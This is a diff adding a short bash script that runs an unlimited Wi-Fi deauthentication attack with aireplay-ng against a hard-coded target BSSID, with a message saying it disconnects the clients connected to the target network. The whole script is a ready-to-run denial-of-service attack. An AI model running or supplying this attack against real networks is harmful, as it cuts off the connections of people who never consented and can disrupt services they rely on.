@@ -1,0 +1,12 @@
+#!/bin/bash
+ 
+port="wlp1s0"
+monport="wlp1s0mon"  
+ 
+BSSID="B2:BB:E5:A4:DA:07"
+ 
+echo  "Open a new terminal window to disconnect the clients connected to the target network.  "
+
+ 
+sudo aireplay-ng -0 0 -a $BSSID  $monport    
+ 
